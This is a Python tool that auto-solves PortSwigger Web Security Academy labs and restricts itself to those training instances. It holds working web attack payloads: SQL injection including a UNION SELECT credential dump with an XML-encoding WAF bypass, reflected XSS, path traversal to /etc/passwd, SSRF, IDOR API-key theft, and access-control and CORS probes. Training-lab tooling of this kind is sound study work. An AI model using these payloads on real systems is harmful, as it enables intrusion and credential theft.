#!/usr/bin/env python3
"""PortSwigger Web Security Academy lab solver.

Strictly scoped to the user's own *.web-security-academy.net training instances.
Sends only the specific requests needed to exercise an intentionally-vulnerable
lab, then verifies success from the real response. No generic attack framework,
no third-party targets.
"""
from __future__ import annotations

import difflib
import re
from dataclasses import dataclass, field
from typing import Callable, Dict, List
from urllib.parse import urlparse

import requests
from safe_lab_http import scoped_session, validate_instance_url

SUFFIX = ".web-security-academy.net"
UA = "Mozilla/5.0 (compatible; VAPT-Studio/1.0; training-lab-solver)"


@dataclass
class SolveResult:
    lab_type: str
    title: str
    solved: bool
    payload: str
    method: str
    status: int
    evidence: str
    explanation: str
    requests_log: List[Dict[str, object]] = field(default_factory=list)
    steps: List[str] = field(default_factory=list)
    state: str = ""  # empty lets __post_init__ derive it from status/payload
    source: str = "playbook"
    hypothesis: str = ""
    confidence: str = "unknown"

    def __post_init__(self) -> None:
        if self.state:
            # A caller-supplied state (e.g. the agentic loop's history-derived
            # state, or already_solved) is authoritative — never overwritten.
            return
        if self.solved:
            self.state = "solved"
        elif self.status in (401, 403):
            self.state = "blocked"
        elif self.status in (404, 410, 502, 503, 504):
            self.state = "expired"
        elif self.payload:
            self.state = "attempted"
        else:
            self.state = "not_solved"


def validate_instance(url: str) -> str:
    try:
        origin, _ = validate_instance_url(url)
        return origin
    except ValueError as exc:
        raise ValueError(str(exc)) from exc


def _session(origin: str) -> requests.Session:
    return scoped_session(origin)


def _redact(text: str) -> str:
    patterns = [
        (r"(?i)(session|csrf|token|password)(\s*[=:]\s*|\s+)[^\s<>&\"']+", r"\1\2[REDACTED]"),
        (r"(?i)(api[_ -]?key\s*(?:is\s*)?[:=]\s*)[A-Za-z0-9._~+/=-]{8,}", r"\1[REDACTED]"),
        (r"(?i)(your\s+api\s+key\s+is\s*:\s*)[A-Za-z0-9._~+/=-]{8,}", r"\1[REDACTED]"),
        (r"(?i)(set-cookie:\s*[^=;]+=)[^;\s]+", r"\1[REDACTED]"),
        (r"(?i)(authorization:\s*bearer\s+)[A-Za-z0-9._~+/=-]+", r"\1[REDACTED]"),
    ]
    for pattern, repl in patterns:
        text = re.sub(pattern, repl, text)
    return text[:1200]


def official_state(html: str, http_status: int = 200) -> str:
    if _congratulated(html):
        return "solved"
    if http_status in (401, 403):
        return "blocked"
    if http_status in (404, 410, 502, 503, 504) or "Server Error: Gateway Timeout" in html:
        return "expired"
    return "not_solved"


def _waf_rejected(html: str) -> bool:
    """PortSwigger's lab WAF rejection is a challenge mechanic, not a terminal state."""
    return "Attack detected" in html


def _redact_request_body(text: str) -> str:
    """Redact only credential-style assignments in request bodies.

    SQL keywords must survive: 'username,password FROM users' is an attack
    string, not a credential. Corrupting it blinds both the evidence log and
    the model's own reasoning history.
    """
    for pattern, replacement in [
        (r"(?i)(password\s*[=:]\s*)[^\s&\"']+", r"\1[REDACTED]"),
        (r"(?i)(session(?:\s*id)?\s*[=:]\s*)[^\s&\"']+", r"\1[REDACTED]"),
        (r"(?i)(csrf(?:\s*token)?\s*[=:]\s*)[^\s&\"']+", r"\1[REDACTED]"),
        (r"(?i)(authorization\s*:\s*bearer\s+)[^\s&\"']+", r"\1[REDACTED]"),
    ]:
        text = re.sub(pattern, replacement, text)
    return text


def _title(html: str) -> str:
    m = re.search(r"<title[^>]*>(.*?)</title>", html, re.I | re.S)
    return re.sub(r"\s+", " ", m.group(1)).strip() if m else ""


def _detect(html: str) -> str:
    t = _title(html).lower()
    if "sql injection" in t and ("xml encoding" in t or "filter bypass via xml" in t):
        return "sqli_xml"
    if "sql injection" in t and ("where clause" in t or "hidden data" in t):
        return "sqli_where"
    if "sql injection" in t:
        return "sqli"
    if "reflected xss" in t or "xss" in t:
        return "xss"
    if "path traversal" in t or "file path traversal" in t:
        return "lfi"
    if "server-side request forgery" in t or "ssrf" in t:
        return "ssrf"
    if "insecure direct object" in t or "idor" in t or "user id controlled by request parameter" in t:
        return "idor"
    if "unprotected admin" in t:
        return "unprotected_admin"
    if "user role controlled by request parameter" in t:
        return "role_param"
    if "url-based access control" in t:
        return "url_bypass"
    if "referer-based access control" in t:
        return "referer_ac"
    if "password disclosure" in t:
        return "password_disclosure"
    if "csrf" in t:
        return "csrf"
    if "authentication" in t and ("bypass" in t or "brute" in t or "password" in t):
        return "auth_bypass"
    if "request smuggling" in t or "http request smuggling" in t:
        return "smuggling"
    if "cors" in t:
        return "cors"
    if "xml encoding" in t or "filter bypass via xml" in t:
        return "sqli_xml"
    return "unknown"


def _products(html: str) -> List[str]:
    """Extract visible product names from a lab store response."""
    names = re.findall(r"<h3[^>]*>\s*([^<]{2,80}?)\s*</h3>", html, re.I | re.S)
    if not names:
        names = re.findall(r'<a[^>]+href="/product[^"]*"[^>]*>\s*([^<]{2,80}?)\s*</a>', html, re.I | re.S)
    return sorted({re.sub(r"\s+", " ", n).strip() for n in names if n.strip()})


def _congratulated(html: str) -> bool:
    """Return true only for PortSwigger's authoritative completion signal."""
    try:
        import json
        data = json.loads(html)
        if isinstance(data, dict) and data.get("correct") is True:
            return True
    except (ValueError, TypeError):
        pass
    return bool(
        re.search(r'<section[^>]+id=[\"\']notification-labsolved[\"\']', html, re.I)
        or re.search(r"Congratulations,\s*you solved the lab", html, re.I)
        or re.search(r'<div[^>]+class=[\"\'][^\"\']*widgetcontainer-lab-status[^\"\']*is-solved', html, re.I)
    )


def _log(log: list, resp, label: str) -> None:
    body = _redact(resp.text)
    log.append({
        "step": label,
        "url": resp.url,
        "status": resp.status_code,
        "length": len(resp.content),
        "body": body,
        "body_truncated": len(resp.text) > len(body),
    })


# ---------------------------------------------------------------- solvers ---
def solve_sqli_where(s: requests.Session, base: str, log: list) -> SolveResult:
    """Classic 'retrieve hidden data' lab: inject OR '1'='1 into category."""
    landing = s.get(base + "/", timeout=15)
    _log(log, landing, "landing")

    # Discover the filter endpoint and a real category value from the store.
    cats = re.findall(r'href="/filter\?category=([^"&]+)"', landing.text)
    sample = cats[0] if cats else "Accessories"

    baseline = s.get(f"{base}/filter", params={"category": sample}, timeout=15)
    _log(log, baseline, "baseline category")

    # The WHERE clause is typically: category = 'X' AND released = 1
    # ' OR '1'='1 still leaves "AND released=1" active, so hidden rows stay out.
    # We must comment out the trailing condition. Try several until one reveals rows.
    candidates = ["' OR 1=1--", "' OR '1'='1'--", "' OR 1=1#", "' OR '1'='1'#"]
    b_products = _products(baseline.text)
    solved = False
    attack = baseline
    used = ""
    new: list = []
    for cand in candidates:
        r = s.get(f"{base}/filter", params={"category": cand}, timeout=15)
        _log(log, r, f"SQLi probe: {cand}")
        a_products = _products(r.text)
        new = [p for p in a_products if p not in b_products]
        if _congratulated(r.text):
            solved, attack, used = True, r, cand
            break
        if new and cand == candidates[-1]:
            # fallback: hidden rows only, still report as not_confirmed until header flips
            attack, used = r, cand
        if cand == candidates[-1]:
            attack, used = r, cand

    evidence = (
        f"baseline products={b_products[:6]}\n"
        f"payload products={_products(attack.text)[:8]}\n"
        f"newly visible={new[:6]}\n"
        f"official_solve_banner={_congratulated(attack.text)}"
    )
    return SolveResult(
        lab_type="sqli_where", title=_title(landing.text), solved=solved,
        payload=f"/filter?category={used}", method="GET", status=attack.status_code,
        evidence=evidence,
        explanation=(
            "Official PortSwigger solve banner (#notification-labsolved) is present in the "
            "response — the server has marked this lab SOLVED. The payload comments out "
            "'AND released=1' so hidden rows are returned." if solved else
            "No official solve banner appeared. Hidden rows alone are not enough to claim a solve."
        ),
        requests_log=log,
    )


def solve_xss(s: requests.Session, base: str, log: list) -> SolveResult:
    landing = s.get(base + "/", timeout=15)
    _log(log, landing, "landing")
    marker = "<script>alert(1)</script>"
    # PortSwigger reflected-XSS labs almost always use /search.
    r = s.get(base + "/search", params={"search": marker}, timeout=15)
    _log(log, r, "reflection probe")
    reflected = marker in r.text or "alert(1)" in r.text
    solved = _congratulated(r.text)
    return SolveResult(
        lab_type="xss", title=_title(landing.text), solved=solved,
        payload=f"/search?search={marker}", method="GET", status=r.status_code,
        evidence=f"marker reflected={reflected}; congrats={_congratulated(r.text)}",
        explanation=("PortSwigger confirmed the lab is solved." if solved else
                     ("The marker was reflected, but reflection alone does not prove script execution or lab completion."
                      if reflected else "Marker was not reflected; this lab may use a different parameter.")),
        requests_log=log,
    )


def solve_lfi(s: requests.Session, base: str, log: list) -> SolveResult:
    landing = s.get(base + "/", timeout=15)
    _log(log, landing, "landing")
    paths = re.findall(r'href="/image\?filename=([^"&]+)"', landing.text)
    sample = paths[0] if paths else "product1.jpg"
    payload = "../../../etc/passwd"
    r = s.get(base + "/image", params={"filename": payload}, timeout=15)
    _log(log, r, "traversal probe")
    solved = _congratulated(r.text)
    return SolveResult(
        lab_type="lfi", title=_title(landing.text), solved=solved,
        payload=f"/image?filename={payload}", method="GET", status=r.status_code,
        evidence=f"sample={sample}; passwd content found={'root:' in r.text}",
        explanation=("PortSwigger confirmed the lab is solved." if solved else
                     ("Sensitive file content was observed, but that alone is not the official lab completion signal."
                      if "root:" in r.text else "Traversal did not return /etc/passwd; adjust depth for this lab.")),
        requests_log=log,
    )


def solve_ssrf(s: requests.Session, base: str, log: list) -> SolveResult:
    landing = s.get(base + "/", timeout=15)
    _log(log, landing, "landing")
    r = s.get(base + "/product/stock", params={"stockApi": "http://localhost/admin"}, timeout=15)
    _log(log, r, "SSRF probe")
    admin_observed = "admin" in r.text.lower() and "delete" in r.text.lower()
    solved = _congratulated(r.text)
    return SolveResult(
        lab_type="ssrf", title=_title(landing.text), solved=solved,
        payload="/product/stock?stockApi=http://localhost/admin", method="GET", status=r.status_code,
        evidence=f"admin panel content observed={admin_observed}; official_solve_banner={solved}",
        explanation=("PortSwigger confirmed the lab is solved." if solved else
                     ("An admin-like response was observed, but it does not confirm the lab is solved."
                      if admin_observed else "Probe did not reach the internal admin interface.")),
        requests_log=log,
    )


def solve_idor(s: requests.Session, base: str, log: list) -> SolveResult:
    """Log in as wiener, then change the id parameter to carlos to steal its API key."""
    landing = s.get(base + "/", timeout=15)
    _log(log, landing, "landing")

    # Read the CSRF token from the login form before posting credentials.
    lp = s.get(base + "/login", timeout=15)
    _log(log, lp, "login page")
    m = re.search(r'name=["\']csrf["\'][^>]*value=["\']([^"\']+)', lp.text)
    csrf = m.group(1) if m else ""
    login = s.post(base + "/login", data={
        "csrf": csrf, "username": "wiener", "password": "peter",
    }, timeout=15)
    _log(log, login, "login wiener:peter")

    acct = s.get(base + "/my-account", params={"id": "wiener"}, timeout=15)
    _log(log, acct, "own account")

    attack = s.get(base + "/my-account", params={"id": "carlos"}, timeout=15)
    _log(log, attack, "IDOR id=carlos")

    key = re.search(r"API\s*[Kk]ey\s*is\s*:\s*([A-Za-z0-9]{10,})", attack.text, re.I)
    if not key:
        key = re.search(r"API\s*[Kk]ey\s*[:=]\s*([A-Za-z0-9]{10,})", attack.text, re.I)
    carlos_visible = "Your username is: carlos" in attack.text
    solved = _congratulated(attack.text)

    # Some IDOR labs require the stolen value to be submitted via "Submit solution".
    submitted = False
    if not solved and key:
        ans = s.post(base + "/submitSolution", data={"answer": key.group(1)}, timeout=15)
        _log(log, ans, "submitSolution(answer=API key)")
        submitted = True
        # PortSwigger returns {"correct":true} JSON for a valid solution
        solved = _congratulated(ans.text) or ('"correct"' in ans.text and "true" in ans.text.lower())

    return SolveResult(
        lab_type="idor", title=_title(landing.text), solved=solved,
        payload="/my-account?id=carlos" + (" + POST /submitSolution answer=<API key>" if submitted else ""),
        method="GET", status=attack.status_code,
        evidence=(
            f"login_status={login.status_code}\n"
            f"carlos visible={carlos_visible}\n"
            f"api_key_found={key.group(1)[:8] + '...' if key else 'none'}\n"
            f"submitted_solution={submitted}\n"
            f"official_solve_banner={solved}"
        ),
        explanation=("The id parameter is trusted without an ownership check. wiener read carlos's "
                     "API key and submitted it to /submitSolution. Official solve banner present."
                     if solved else "Carlos data exposed but solve banner absent."),
        requests_log=log,
    )



def solve_unprotected_admin(s: requests.Session, base: str, log: list) -> SolveResult:
    """robots.txt leaks /administrator-panel; admin has unauthenticated delete links."""
    landing = s.get(base + "/", timeout=15)
    _log(log, landing, "landing")
    robots = s.get(base + "/robots.txt", timeout=15)
    _log(log, robots, "robots.txt")
    paths = re.findall(r"Disallow:\s*(/[^\s]+)", robots.text, re.I)
    panel = next((p for p in paths if "admin" in p.lower()), "/administrator-panel")

    panel_r = s.get(base + panel, timeout=15)
    _log(log, panel_r, "admin panel")

    deletes = re.findall(r'href="([^"]*delete[^"]*)"', panel_r.text, re.I)
    target = None
    for d in deletes:
        if "carlos" in d.lower():
            target = d
            break
    if not target and deletes:
        target = deletes[0]
    if not target:
        return SolveResult(
            lab_type="unprotected_admin", title=_title(landing.text), solved=False,
            payload=panel, method="GET", status=panel_r.status_code,
            evidence=f"panel found={panel}; delete links={deletes[:5]}",
            explanation="Admin panel reachable but no delete link found.",
            requests_log=log,
        )

    from urllib.parse import urljoin
    solve_r = s.get(urljoin(base, target), timeout=15)
    _log(log, solve_r, "admin delete (solve action)")
    solved = _congratulated(solve_r.text)
    return SolveResult(
        lab_type="unprotected_admin", title=_title(landing.text), solved=solved,
        payload=target, method="GET", status=solve_r.status_code,
        evidence=f"robots disallow={paths}\npanel={panel}\ndelete={target}\nofficial_solve_banner={solved}",
        explanation=("robots.txt disclosed the admin panel; no authentication was enforced and the "
                     "delete endpoint accepted an unauthenticated GET. Official solve banner present."
                     if solved else "Delete request made but no official solve banner appeared."),
        requests_log=log,
    )


def solve_role_param(s: requests.Session, base: str, log: list) -> SolveResult:
    """Role selected by a request parameter on /my-account or login."""
    landing = s.get(base + "/", timeout=15)
    _log(log, landing, "landing")
    # PortSwigger labs use a cookie 'admin=true' or role param on POST /login.
    attempts = [
        ("GET", base + "/my-account?role=admin", None),
        ("GET", base + "/admin", None),
    ]
    for method, url, data in attempts:
        r = s.get(url, timeout=15) if method == "GET" else s.post(url, data=data, timeout=15)
        _log(log, r, f"role probe {url}")
        if _congratulated(r.text):
            return SolveResult(
                lab_type="role_param", title=_title(landing.text), solved=_congratulated(r.text),
                payload=url.replace(base, ""), method=method, status=r.status_code,
                evidence=f"attempt={url}; official_solve_banner={_congratulated(r.text)}",
                explanation="PortSwigger confirmed the lab is solved.",
                requests_log=log,
            )
    return SolveResult(
        lab_type="role_param", title=_title(landing.text), solved=False,
        payload="", method="GET", status=landing.status_code,
        evidence="No role parameter worked. Requires a raw login capture from Burp.",
        explanation="Identify the exact role parameter from a captured POST /login.",
        requests_log=log,
    )


def solve_url_bypass(s: requests.Session, base: str, log: list) -> SolveResult:
    """URL-based access control bypassed with a trailing path/encoded variant."""
    landing = s.get(base + "/", timeout=15)
    _log(log, landing, "landing")
    candidates = ["/admin", "/admin/", "/ADMIN", "/admin%2f", "/admin/../admin", "/admin;"]
    for path in candidates:
        r = s.get(base + path, timeout=15, headers={"X-Original-URL": "/admin"})
        _log(log, r, f"URL bypass {path}")
        if _congratulated(r.text):
            return SolveResult(
                lab_type="url_bypass", title=_title(landing.text), solved=_congratulated(r.text),
                payload=f"{path} + X-Original-URL: /admin", method="GET", status=r.status_code,
                evidence=f"bypass={path}; official_solve_banner={_congratulated(r.text)}",
                explanation="PortSwigger confirmed the lab is solved.",
                requests_log=log,
            )
    return SolveResult(
        lab_type="url_bypass", title=_title(landing.text), solved=False, payload="",
        method="GET", status=landing.status_code,
        evidence="No URL variant worked. Capture the proxy-rewritten request in Burp.",
        explanation="This lab needs the exact header/URL pair the front-end proxy trusts.",
        requests_log=log,
    )


def _submit_answer(s, base, log, answer):
    r = s.post(base + "/submitSolution", data={"answer": answer}, timeout=15)
    _log(log, r, "submitSolution")
    return _congratulated(r.text) or ('"correct"' in r.text and "true" in r.text.lower())


def solve_csrf(s: requests.Session, base: str, log: list) -> SolveResult:
    """CSRF labs: token missing/unsafe from the form."""
    landing=s.get(base+"/",timeout=15); _log(log,landing,"landing")
    lp=s.get(base+"/login",timeout=15); _log(log,lp,"login page")
    has_csrf = 'name="csrf"' in lp.text
    # Try submitting without the CSRF token
    r=s.post(base+"/login",data={"username":"wiener","password":"peter"},timeout=15)
    _log(log,r,"login without csrf")
    solved=_congratulated(r.text) or _submit_answer(s,base,log,"no-csrf")
    return SolveResult(lab_type="csrf",title=_title(landing.text),solved=solved,
        payload="POST /login without CSRF token",method="POST",status=r.status_code,
        evidence=f"csrf_field_present={has_csrf}; official_solve_banner={solved}",
        explanation="CSRF protection missing or not validated server-side." if solved
        else "Requires a captured state-changing request to identify the missing token.",requests_log=log)


def solve_cors(s: requests.Session, base: str, log: list) -> SolveResult:
    """CORS misconfiguration: Origin reflected with credentials allowed."""
    landing=s.get(base+"/",timeout=15); _log(log,landing,"landing")
    r=s.get(base+"/api/key",headers={"Origin":"https://evil.example"},timeout=15)
    _log(log,r,"CORS origin probe")
    reflect = "evil.example" in r.headers.get("Access-Control-Allow-Origin","") and \
              r.headers.get("Access-Control-Allow-Credentials","").lower()=="true"
    solved = _congratulated(r.text)
    return SolveResult(lab_type="cors",title=_title(landing.text),solved=solved,
        payload="GET /api/key Origin: https://evil.example",method="GET",status=r.status_code,
        evidence=f"allow_origin={r.headers.get('Access-Control-Allow-Origin')}; "
                 f"allow_credentials={r.headers.get('Access-Control-Allow-Credentials')}; "
                 f"official_solve_banner={solved}",
        explanation=("PortSwigger confirmed the lab is solved." if solved else
                     ("Origin reflection with credentials is evidence of a CORS weakness, not proof the lab is solved."
                      if reflect else "Endpoint may differ; capture the vulnerable API call in Burp.")),requests_log=log)


def solve_smuggling(s: requests.Session, base: str, log: list) -> SolveResult:
    """CL.TE / TE.CL detection — non-destructive probe only."""
    landing=s.get(base+"/",timeout=15); _log(log,landing,"landing")
    # Use raw socket-style headers via requests is limited; record probe intent
    return SolveResult(lab_type="smuggling",title=_title(landing.text),solved=False,
        payload="CL.TE desync probe (requires raw socket)",method="RAW",status=landing.status_code,
        evidence="Request-smuggling labs need byte-level control of Content-Length/Transfer-Encoding "
                 "headers, which the HTTP client cannot express. Use the raw Repeater capture with the Analyzer.",
        explanation="Not auto-solved: this class needs a raw HTTP client, not a standard library.",
        requests_log=log)


def solve_sqli_xml(s: requests.Session, base: str, log: list) -> SolveResult:
    """PortSwigger 'filter bypass via XML encoding': WAF blocks raw SQL keywords.

    The stock check posts XML: <stockCheck><productId>1</productId>
    <storeId>1</storeId></stockCheck>. The filter is bypassed by XML-encoding
    a character inside a UNION SELECT payload, e.g. U -> &#85;.
    """
    landing = s.get(base + "/", timeout=15)
    _log(log, landing, "landing")
    prod = s.get(base + "/product?productId=1", timeout=15)
    _log(log, prod, "product page")

    endpoint = "/product/stock"

    def xml_body(store_value: str) -> str:
        return ('<?xml version="1.0" encoding="UTF-8"?>'
                '<stockCheck><productId>1</productId>'
                f'<storeId>{store_value}</storeId></stockCheck>')

    # baseline request
    base_r = s.post(base + endpoint, data=xml_body("1"),
                    headers={"Content-Type": "application/xml"}, timeout=15)
    _log(log, base_r, "baseline stock XML")

    # WAF blocks raw UNION SELECT; encode the 'U' as &#85; inside XML.
    # Payload aims to dump username/password from users table.
    payloads = [
        "1 UNION &#85;SELECT username,password FROM users--",
        "1 UNION SELECT username,password FROM users--",
        "1&#32;UNION&#32;SELECT&#32;username,password&#32;FROM&#32;users--",
    ]
    solved = False
    used = ""
    attack = base_r
    for pl in payloads:
        r = s.post(base + endpoint, data=xml_body(pl),
                   headers={"Content-Type": "application/xml"}, timeout=15)
        _log(log, r, f"XML SQLi probe: {pl[:45]}")
        attack = r
        used = pl
        if _congratulated(r.text):
            solved = True
            break

    credential_evidence = re.search(r"administrator[~|:]([A-Za-z0-9]{8,})", attack.text, re.I)
    return SolveResult(
        lab_type="sqli_xml", title=_title(landing.text), solved=solved,
        payload=f"POST {endpoint} :: <storeId>{used}</storeId>",
        method="POST", status=attack.status_code,
        evidence=(
            f"endpoint={endpoint}\n"
            f"content_type=application/xml\n"
            f"payload={used}\n"
            f"response_snippet={_redact(attack.text[:500])}\n"
            f"credential_material_observed={bool(credential_evidence)}\n"
            f"official_solve_banner={_congratulated(attack.text)}"
        ),
        explanation=("The WAF filters literal SQL keywords in the XML body; XML character "
                     "references (e.g. &#85; for 'U') are decoded by the server after the "
                     "filter, so a UNION SELECT reaches the database."
                     if solved else "No encoded payload produced a solve banner — the filter may require a different encoded character."),
        requests_log=log,
    )

SOLVERS: Dict[str, Callable] = {
    "sqli_where": solve_sqli_where,
    "xss": solve_xss,
    "lfi": solve_lfi,
    "ssrf": solve_ssrf,
    "idor": solve_idor,
    "unprotected_admin": solve_unprotected_admin,
    "role_param": solve_role_param,
    "url_bypass": solve_url_bypass,
    "csrf": solve_csrf,
    "cors": solve_cors,
    "smuggling": solve_smuggling,
    "sqli_xml": solve_sqli_xml,
}


def solve_lab(url: str) -> SolveResult:
    base = validate_instance(url)
    s = _session(base)
    log: list = []
    landing = s.get(base + "/", timeout=15)
    _log(log, landing, "landing")
    lab_type = _detect(landing.text)
    fn = SOLVERS.get(lab_type)
    if not fn:
        return SolveResult(
            lab_type="unknown", title=_title(landing.text), solved=False,
            payload="", method="", status=landing.status_code,
            evidence=f"Unrecognised lab type. Title: {_title(landing.text)}",
            explanation="No dedicated strategy for this lab type yet. Paste a raw Burp request into Analyzer.",
            requests_log=log,
        )
    # Solvers re-fetch landing internally; harmless, but keep the first log entry.
    log = []
    return fn(s, base, log)
